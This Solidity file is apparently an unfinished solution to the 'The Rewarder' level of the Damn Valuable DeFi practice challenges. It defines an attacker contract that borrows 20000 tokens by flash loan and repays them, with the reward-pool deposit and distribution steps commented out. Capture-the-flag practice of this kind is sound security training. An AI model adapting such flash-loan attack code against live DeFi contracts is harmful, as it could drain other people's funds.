import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "hardhat/console.sol";
import "../DamnValuableToken.sol";

contract AttackerReward {
    FlashLoanerPool immutable flashLoanerPool;
    TheRewarderPool immutable theRewarderPool;
    DamnValuableToken public immutable liquidityToken;

    constructor (address _flashLoanerPool, address _theRewarderPool, address _liquidityToken){
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        theRewarderPool = TheRewarderPool(_theRewarderPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
    }

    function flashloanattack() external{
        flashLoanerPool.flashLoan(20000e18);
    }

    function receiveFlashLoan (uint256 _amount) external{
        console.log("_amount check ->", _amount);
        // theRewarderPool.deposit(10000e18);
        // theRewarderPool.deposit(10000e18);
        // theRewarderPool.distributeRewards();
        liquidityToken.transfer(address(flashLoanerPool), _amount);
    }

}